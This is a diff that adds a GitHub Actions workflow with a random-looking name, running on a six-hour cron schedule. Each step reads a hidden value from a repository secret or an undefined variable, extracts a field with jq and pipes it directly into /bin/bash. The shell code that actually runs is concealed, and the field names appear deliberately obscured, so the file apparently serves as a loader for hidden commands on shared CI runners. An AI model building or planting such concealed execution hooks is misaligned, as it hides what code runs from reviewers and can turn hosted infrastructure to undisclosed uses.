@@ -1,0 +1,23 @@
+name: huaxionghui1998
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 1/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: huaxionghui1998
+        env:
+          nis4: ${{ secrets.nis4 }}
+        run: |
+          echo $nis4 | jq -r .pgdfj4 | /bin/bash
+          echo $r8 | jq -r .vok7 | /bin/bash
+          echo $kdgd0 | jq -r .tv984 | /bin/bash
+          echo $rgzcc31 | jq -r .t60509 | /bin/bash
+          echo $e25486 | jq -r .iti374 | /bin/bash
+          echo $p03089 | jq -r .tu65628 | /bin/bash
+
